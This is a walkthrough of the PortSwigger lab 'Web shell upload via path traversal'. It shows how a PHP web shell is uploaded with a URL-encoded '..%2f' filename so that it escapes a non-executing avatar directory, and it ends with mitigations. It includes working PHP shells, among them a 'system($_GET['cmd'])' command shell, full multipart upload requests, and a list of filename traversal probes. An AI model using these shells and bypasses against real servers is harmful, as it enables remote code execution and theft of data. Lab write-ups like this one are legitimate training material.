# 📘 PortSwigger Lab: Web shell upload via path traversal

<a id="top"></a>

> 🔗 Official Lab: https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-path-traversal  
> 🎯 Topic: File Upload + Path Traversal — escaping an execution-blocked upload directory  
> 🧪 Difficulty: Practitioner  
> ✅ Status: Solved  

---

## 📑 Contents

- [🎯 Goal](#goal)
- [🧠 Short Theory](#theory)
- [🧩 Core Idea](#idea)
- [🚫 Why Files Are Not Executed in the Upload Directory](#execution-block)
- [🏗 Bypassing via Upload to the Parent Directory](#traversal-upload)
- [🐚 Web Shell](#webshell)
- [⚡ The Exploit Payload](#exploit)
- [🔍 Step 1 — Recon the Upload Function and Serving Path](#step1)
- [🔍 Step 2 — Upload the PHP Shell and Confirm the Execution Ban](#step2)
- [🔍 Step 3 — Attempt Path Traversal via the Filename](#step3)
- [🔍 Step 4 — Bypass the Stripping via URL Encoding](#step4)
- [🔍 Step 5 — Execute the Shell and Retrieve the Secret](#step5)
- [📨 Example Requests](#requests)
- [📥 Example Result](#response)
- [🧾 Complete Attack Chain](#attack-chain)
- [🔬 Why the Attack Worked](#breakdown)
- [🧠 Pentester Mindset](#pentester)
- [🧪 Additional Tests](#additional-tests)
- [❌ Common Mistakes](#mistakes)
- [🛡 Mitigation](#defense)
- [✅ Checklist](#checklist)
- [🧾 Conclusion](#conclusion)

---

<a id="goal"></a>

## 🎯 Goal

Bypass the file-execution ban in the upload directory via a secondary vulnerability (path traversal), to:

```text
1. Upload a PHP web shell into the parent directory (/files).
2. Execute it where PHP interpretation is enabled.
3. Exfiltrate the contents of /home/carlos/secret and submit it as the solution.
```

Test user credentials:

```text
wiener:peter
```

---

<a id="theory"></a>

## 🧠 Short Theory

A common defense against upload-to-RCE: the server **does not execute** files in the upload directory. It stores `exploit.php` in `/files/avatars/`, but when requested, serves it as **plain text** instead of invoking the PHP interpreter:

```text
GET /files/avatars/exploit.php
Response: <?php echo file_get_contents('/home/carlos/secret'); ?>
          (source code, not the execution output)
```

This configuration assumes: "user files live only in /files/avatars/". If the filename allows escaping that directory, the file can be placed where **execution is enabled**:

```text
filename="../exploit.php"
→ the file is stored in /files/exploit.php (one level up)
→ if /files/ executes PHP — RCE
```

This is a combination of two vulnerabilities: **unsanitized filename** + **naive execution segmentation**.

---

<a id="idea"></a>

## 🧩 Core Idea

The `/files/avatars/` directory is an "execution-free zone", but the `/files/` directory one level up executes PHP. The filename in the multipart request is attacker-controlled:

```text
filename="../exploit.php"   → escape from avatars/ into /files/
```

```text
Filter:      the .php extension is allowed (no type check)
Storage:     the filename is used as-is → path traversal
Execution:   /files/ runs PHP → RCE
```

---

<a id="execution-block"></a>

## 🚫 Why Files Are Not Executed in the Upload Directory

At the web-server level, script handling is often disabled for upload directories:

```nginx
# nginx
location /files/avatars/ {
    default_type text/plain;   # served as text
}

# Apache
<Directory /files/avatars/>
    php_admin_flag engine off
</Directory>
```

Such segmentation is a good idea, but it protects **only that specific directory**. If an upload can escape into a neighboring directory where execution is enabled, the defense collapses. This is the same principle of "the check does not match the execution boundary" seen in all the SSRF filters.

---

<a id="traversal-upload"></a>

## 🏗 Bypassing via Upload to the Parent Directory

Upload and path traversal are usually treated as separate topics, but the multipart filename is the same kind of "path" that the server may incorrectly join:

```text
/files/avatars/ + ../exploit.php  →  /files/exploit.php
```

A server that does not sanitize `../` in the filename lets the attacker choose the **storage directory**.

---

<a id="webshell"></a>

## 🐚 Web Shell

Minimal PHP shell for reading the target file:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Universal variant:

```php
<?php echo system($_GET['cmd']); ?>
```

---

<a id="exploit"></a>

## ⚡ The Exploit Payload

File to upload (`exploit.php`):

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

The key modification — the filename in the multipart request:

```text
Naive attempt:  filename="../exploit.php"      → stripped by the server
Working:        filename="..%2fexploit.php"    → the server decodes → ../exploit.php
```

---

<a id="step1"></a>

## 🔍 Step 1 — Recon the Upload Function and Serving Path

1. Log in as `wiener:peter`.
2. Upload a normal image as the avatar.
3. Return to the account page.
4. In Burp → Proxy → HTTP history, find the avatar-serving request:

```http
GET /files/avatars/<YOUR-IMAGE> HTTP/1.1
```

and send it to Repeater.

---

<a id="step2"></a>

## 🔍 Step 2 — Upload the PHP Shell and Confirm the Execution Ban

1. Create a local `exploit.php`:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

2. Upload it as the avatar. The server **does not block** PHP:

```text
The file avatars/exploit.php has been uploaded.
```

3. In Repeater, replace the image name with `exploit.php` and send the GET:

```http
GET /files/avatars/exploit.php
```

4. The response is the **PHP source as plain text**, not the execution output:

```text
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

Confirmed: execution is banned in `/files/avatars/`. The upload works, the RCE does not — a bypass is needed.

---

<a id="step3"></a>

## 🔍 Step 3 — Attempt Path Traversal via the Filename

In the POST upload request, modify the file part's `Content-Disposition`:

```text
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

Send. Response:

```text
The file avatars/exploit.php has been uploaded.
```

⚠️ The server **stripped** `../` from the name — the message says the file was stored as `avatars/exploit.php` (the same directory). The server cleans out `../` sequences.

---

<a id="step4"></a>

## 🔍 Step 4 — Bypass the Stripping via URL Encoding

A classic trick against a strip filter: encode `/` so the stripping fails while decoding still restores the sequence:

```text
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

Send. Response:

```text
The file avatars/../exploit.php has been uploaded.
```

The message shows the **unstripped** name with `../` — the server decodes `%2f` itself and now stores the file **one level up**, in `/files/`.

The server's processing order:

```text
Received:   ..%2fexploit.php
Sanitize:   no ../ in the raw string → stripping does not trigger
URL-decode: %2f → / → the path "../exploit.php"
Storage:    /files/exploit.php  (escaped avatars/)
```

---

<a id="step5"></a>

## 🔍 Step 5 — Execute the Shell and Retrieve the Secret

1. Return to the account page in the browser (refresh the avatar).
2. In HTTP history, find the request:

```http
GET /files/avatars/..%2fexploit.php
```

3. The response is the secret, not the source:

```text
SECRET-VALUE-HERE
```

The file physically resides in `/files/exploit.php` — an executable directory, so the PHP ran. An equivalent request is `GET /files/exploit.php`.

4. Submit the secret via the button in the lab banner.

The lab is marked:

```text
Solved
```

---

<a id="requests"></a>

## 📨 Example Requests

### Recon: avatar serving

```http
GET /files/avatars/avatar.png HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

### PHP upload (accepted, but not executed)

```http
POST /my-account/avatar HTTP/1.1
Host: LAB-ID.web-security-academy.net
Cookie: session=YOUR-SESSION-COOKIE
Content-Type: multipart/form-data; boundary=--------------------

--------------------
Content-Disposition: form-data; name="avatar"; filename="exploit.php"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--------------------
Content-Disposition: form-data; name="user"

wiener
--------------------
Content-Disposition: form-data; name="csrf"

YOUR-CSRF-TOKEN
--------------------
```

### Traversal attempt — stripped

```text
Content-Disposition: form-data; name="avatar"; filename="../exploit.php"
```

Response:

```text
The file avatars/exploit.php has been uploaded.
```

### Working bypass — URL-encoded slash

```text
Content-Disposition: form-data; name="avatar"; filename="..%2fexploit.php"
```

Response:

```text
The file avatars/../exploit.php has been uploaded.
```

### Request to the shell

```http
GET /files/avatars/..%2fexploit.php HTTP/1.1
Host: LAB-ID.web-security-academy.net
```

---

<a id="response"></a>

## 📥 Example Result

### Response before the bypass (source)

```http
HTTP/1.1 200 OK
Content-Type: text/plain

<?php echo file_get_contents('/home/carlos/secret'); ?>
```

### Response after the bypass (execution)

```http
HTTP/1.1 200 OK
Content-Type: text/html; charset=UTF-8

SECRET-VALUE-HERE
```

Lab status:

```text
Solved
```

---

<a id="attack-chain"></a>

## 🧾 Complete Attack Chain

```text
1. Log in as wiener:peter
2. Upload a test image, find GET /files/avatars/ in history
3. Upload exploit.php — the upload succeeds
4. GET /files/avatars/exploit.php → PHP source, execution is banned
5. Try filename="../exploit.php" → the server strips ../
6. Switch to filename="..%2fexploit.php" → the stripping is bypassed,
   the server decodes the path and stores the file in /files/
7. Request GET /files/avatars/..%2fexploit.php
8. The server executes the PHP; the secret is returned
9. Submit the secret — the lab is Solved
```

---

<a id="breakdown"></a>

## 🔬 Why the Attack Worked

### 1. Execution Segmentation Is Per-Directory

`/files/avatars/` does not run PHP, but `/files/` does. The defense is bound to one directory, not to the concept of "user files".

### 2. The Filename Is Not Sanitized

The filename from the multipart request is used to build the storage path. The attacker controls not only the name but also the **storage directory**.

### 3. Sanitize and Decode Happen in the Wrong Order

The server strips `../` from the raw string first, then URL-decodes. `%2f` bypasses the sanitizer and becomes `/` after the check:

```text
Sanitize:  ..%2fexploit.php → no ../ → pass
Decode:    ..%2fexploit.php → ../exploit.php → traversal
```

This is the same "the check sees one thing, the execution sees another" desynchronization as in the double URL-encoding SSRF bypass.

### 4. Server Responses Reveal the Filter Logic

The messages `The file avatars/exploit.php has been uploaded.` and `The file avatars/../exploit.php has been uploaded.` directly show how the server processes the name — free reconnaissance.

---

<a id="pentester"></a>

## 🧠 Pentester Mindset

When the upload succeeds but the file does not execute — do not stop:

```text
1. Where is the execution boundary? Test the file in avatars/ — source or output?
2. Where exactly is the file stored? Read the server messages.
3. Can the storage directory be influenced through the filename?
4. How does the filter handle ../? Strip? Block? Decode after the check?
```

Filename probes:

```text
../exploit.php       → test sanitization
..%2fexploit.php     → bypass stripping via encoding
..%252fexploit.php   → double encoding (if the server decodes twice)
....//exploit.php    → bypass recursive stripping
%2e%2e%2fexploit.php → full encoding
```

---

<a id="additional-tests"></a>

## 🧪 Additional Tests

Within an authorized lab, the following can be compared:

### Equivalent path to the shell

```http
GET /files/exploit.php
```

(the file physically resides in `/files/`; both requests reach it)

### Universal shell

```php
<?php echo system($_GET['cmd']); ?>
```

```text
GET /files/exploit.php?cmd=whoami
```

### Deeper traversal (in real systems)

```text
filename="../../exploit.php"
filename="..%2f..%2fexploit.php"
```

---

<a id="mistakes"></a>

## ❌ Common Mistakes

### Mistake 1. Stopping After Seeing the Source

Seeing `<?php ...` in the response instead of output, it is easy to conclude the lab is "broken". It is a signal that the execution ban needs bypassing, not that the attack is over.

### Mistake 2. Not Testing the Plain ../ First

Before encoding, observe what the server does with `../`: the message `avatars/exploit.php` without `../` reveals the strip filter.

### Mistake 3. Encoding the Entire Path Instead of One Character

Encoding just `/` (`%2f`) is enough. Encoding dots is possible, but in this lab the filter strips the sequence with a plain slash.

### Mistake 4. Requesting the File at the Wrong Path After Upload

After `..%2fexploit.php`, the response says `avatars/../exploit.php` — and many attackers request `GET /files/avatars/../exploit.php` literally. Working paths: `GET /files/avatars/..%2fexploit.php` (as in history) or `GET /files/exploit.php`.

### Mistake 5. Ignoring Server Messages

The wording of the upload response is the primary source of truth about **where** the file landed. Not reading it means discarding reconnaissance.

---

<a id="defense"></a>

## 🛡 Mitigation

### 1. Do Not Use the Filename to Build the Path

Generate the name server-side (UUID) and completely ignore the user-supplied one:

```python
name = uuid4().hex + ".png"
```

### 2. Sanitize AFTER Decoding

If the filename is processed anyway — URL-decode first, then normalize the path and verify the result stays inside the allowed directory (canonical path check).

### 3. Disable Execution for ALL User-File Directories

Not only `/files/avatars/` but the entire upload tree. Best practice: store outside the web root and serve through a proxy.

### 4. Validate Content

Extension whitelist + magic bytes + image reprocessing.

### 5. Error Messages Without Reconnaissance

Do not reflect the processed filename or internal paths in responses.

---

<a id="checklist"></a>

## ✅ Checklist

### Reconnaissance

- [ ] Logged in as wiener:peter
- [ ] Uploaded a test image
- [ ] Found `GET /files/avatars/<image>` in HTTP history
- [ ] Sent the GET request to Repeater

### Confirming the Execution Ban

- [ ] `exploit.php` uploaded without blocking
- [ ] `GET /files/avatars/exploit.php` returns the source, not output
- [ ] Concluded: execution is banned in avatars/

### Traversal Bypass

- [ ] `filename="../exploit.php"` → the server stripped `../` (baseline)
- [ ] `filename="..%2fexploit.php"` → the stripping is bypassed
- [ ] The response confirms storage with `../` in the path

### Exploitation

- [ ] `GET /files/avatars/..%2fexploit.php` executed
- [ ] Secret retrieved (and/or `GET /files/exploit.php`)
- [ ] Secret submitted
- [ ] Lab status: Solved

---

<a id="conclusion"></a>

## 🧾 Conclusion

The lab was solved by **bypassing the file-execution ban** using a path traversal in the filename:

```text
1. Execution is banned in /files/avatars/ — the file is served as text
2. filename="../exploit.php" is stripped by the sanitizer
3. filename="..%2fexploit.php" bypasses the stripping —
   the server decodes %2f after the check and stores the file in /files/
4. PHP executes in /files/ → the secret is read
```

Main lessons:

```text
Execution segmentation protects only one directory —
if the file can escape into a neighbor, the defense collapses.
```

```text
Sanitizing before decoding is a classic ordering mistake:
%2f bypasses the check and turns into / after it.
```

```text
The multipart filename controls not just the name but the storage directory.
```

```text
Server responses reflecting the final path are free reconnaissance of the filter logic.
```

---

[⬆ Back to top](#top)
